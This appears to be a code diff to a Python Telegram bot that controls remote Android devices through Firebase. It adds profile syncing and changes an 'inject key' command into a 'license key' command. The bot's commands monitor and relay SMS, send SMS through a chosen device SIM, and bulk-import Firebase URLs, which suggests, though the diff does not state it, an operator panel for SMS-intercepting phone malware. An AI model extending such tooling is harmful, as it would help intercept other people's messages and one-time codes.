@@ -9,13 +9,20 @@ from telegram.ext import Application, CallbackQueryHandler, CommandHandler, Cont
 from app.config import get_settings
 from app.database import Device, MonitorProfile, SMSMessage, SessionLocal
 from app.bulk_firebase import bulk_import_from_txt
-from app.channel_relay import get_profile_by_channel, queue_channel_sms, queue_manual_sms
+from app.channel_relay import (
+    get_profile_by_channel,
+    queue_channel_sms_with_firebase,
+    queue_manual_sms_with_firebase,
+)
+from app.firebase_sync import sync_profile_to_firebase
 from app.device_ui import (
     device_set_keyboard,
     format_addchannel_card,
     format_device_set_card,
     format_firebase_connected_card,
+    format_key_error_card,
     format_key_set_card,
+    format_license_key_set_card,
     format_monitoring_card,
     format_ping_card,
     format_send_queued,
@@ -35,7 +42,7 @@ from app.services import (
     select_sim_slot,
     connect_firebase_url,
     set_channel_id,
-    set_inject_key,
+    set_license_key,
     show_device_by_id,
     set_user_phone,
     start_monitoring,
@@ -191,6 +198,7 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
     finally:
         db.close()
 
+    await sync_profile_to_firebase(profile, device)
     await update.message.reply_text(
         format_monitoring_card(device, profile, ignored_sms=ignored, test_message=test_msg),
         parse_mode="HTML",
@@ -231,6 +239,8 @@ async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     finally:
         db.close()
 
+    if profile and device:
+        await sync_profile_to_firebase(profile, device)
     await update.message.reply_text(
         format_addchannel_card(channel_id, sim_slot=sim_slot),
         parse_mode="HTML",
@@ -251,7 +261,7 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
 
         for profile, device in linked:
             try:
-                outbound = queue_channel_sms(
+                outbound = await queue_channel_sms_with_firebase(
                     db,
                     profile,
                     device,
@@ -397,8 +407,11 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     status_msg = await update.message.reply_text("⏳ Firebase connect ho raha hai...")
 
     db: Session = SessionLocal()
+    device = None
     try:
         profile, _total, online_count = await connect_firebase_url(db, user.id, firebase_url)
+        if profile.active_device_id:
+            device = db.query(Device).filter(Device.id == profile.active_device_id).first()
     except ValueError as exc:
         await status_msg.edit_text(f"❌ {exc}")
         return
@@ -409,6 +422,7 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     finally:
         db.close()
 
+    await sync_profile_to_firebase(profile, device)
     await status_msg.edit_text(
         format_firebase_connected_card(profile.firebase_url or firebase_url, online_count),
         parse_mode="HTML",
@@ -449,6 +463,7 @@ async def device_select_command(update: Update, context: ContextTypes.DEFAULT_TY
     finally:
         db.close()
 
+    await sync_profile_to_firebase(profile, device)
     await send_device_set_ui(update.message, device, profile)
 
 
@@ -498,6 +513,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     finally:
         db.close()
 
+    await sync_profile_to_firebase(profile, device)
     if device:
         await update.message.reply_text(
             format_monitoring_card(device, profile, test_message="Monitor resumed"),
@@ -552,7 +568,7 @@ async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         if not profile or not device:
             await update.message.reply_text("❌ Pehle /setdevice <id> se device select karo.")
             return
-        outbound = queue_manual_sms(db, profile, device, to_number, message)
+        outbound = await queue_manual_sms_with_firebase(db, profile, device, to_number, message)
         sims = get_sim_list(device)
         sim_slot = sims[profile.selected_sim_index or 0]["slot"] if sims else outbound.sim_slot
     except Exception as exc:
@@ -583,28 +599,36 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         return
 
     if not context.args:
-        await update.message.reply_text(
-            "Usage: `/key KEY-XXXX-XXXX-XXXX`\n\n"
-            "Example:\n"
-            "`/key KEY-BQUB-J7LC-EWI1-RW94`",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text(format_key_error_card(), parse_mode="HTML")
         return
 
-    inject_key = context.args[0]
+    key_value = " ".join(context.args)
     db: Session = SessionLocal()
     try:
-        device = set_inject_key(db, user.id, inject_key)
+        profile, display_key, key_type = await set_license_key(db, user.id, key_value)
     except ValueError as exc:
-        await update.message.reply_text(f"❌ {exc}")
+        if str(exc) == "invalid_format":
+            await update.message.reply_text(format_key_error_card(), parse_mode="HTML")
+        else:
+            await update.message.reply_text(f"❌ {exc}")
+        return
+    except Exception as exc:
+        logger.error("License key failed: %s", exc)
+        await update.message.reply_text(f"❌ Error: {exc}")
         return
     finally:
         db.close()
 
-    await update.message.reply_text(
-        format_key_set_card(device.api_key or inject_key),
-        parse_mode="HTML",
-    )
+    if key_type == "firebase":
+        await update.message.reply_text(
+            format_license_key_set_card(display_key),
+            parse_mode="HTML",
+        )
+    else:
+        await update.message.reply_text(
+            format_key_set_card(display_key),
+            parse_mode="HTML",
+        )
 
 
 async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -804,6 +828,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             profile = select_sim_slot(db, user.id, int(sim_index))
             device = db.query(Device).filter(Device.id == int(device_id)).first()
             if device:
+                await sync_profile_to_firebase(profile, device)
                 await query.edit_message_text(
                     format_device_set_card(device, selected_sim=int(sim_index)),
                     parse_mode="HTML",
@@ -812,12 +837,16 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             return
 
         if data.startswith("stop:"):
-            stop_monitoring(db, user.id)
+            profile = stop_monitoring(db, user.id)
+            device = get_active_device(db, user.id)
+            await sync_profile_to_firebase(profile, device)
             await query.edit_message_text("🔴 <b>STOPPED</b>\n\nMonitoring band ho gaya.", parse_mode="HTML")
             return
 
         if data == "monitor:stop":
-            stop_monitoring(db, user.id)
+            profile = stop_monitoring(db, user.id)
+            device = get_active_device(db, user.id)
+            await sync_profile_to_firebase(profile, device)
             await query.edit_message_text("🔴 <b>STOPPED</b>\n\nMonitoring band ho gaya.", parse_mode="HTML")
             return
 
